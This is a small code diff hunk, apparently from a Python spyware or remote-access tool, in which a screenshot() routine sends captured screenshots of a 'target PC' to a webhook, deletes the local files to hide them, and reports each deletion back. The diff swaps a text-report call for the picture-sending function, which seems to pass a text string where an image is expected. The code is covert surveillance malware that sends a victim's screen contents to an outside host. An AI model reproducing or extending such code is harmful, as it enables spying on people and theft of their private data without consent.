@@ -216,7 +216,7 @@ def screenshot():
         send_to_webhook_pic(filename)
         os.remove(filename)
         print(f"Deleted {filename}")
-        send_to_webhook(f"Deleted {filename} on target PC")
+        send_to_webhook_pic(f"Deleted {filename} on target PC")
 
         time.sleep(5)
 
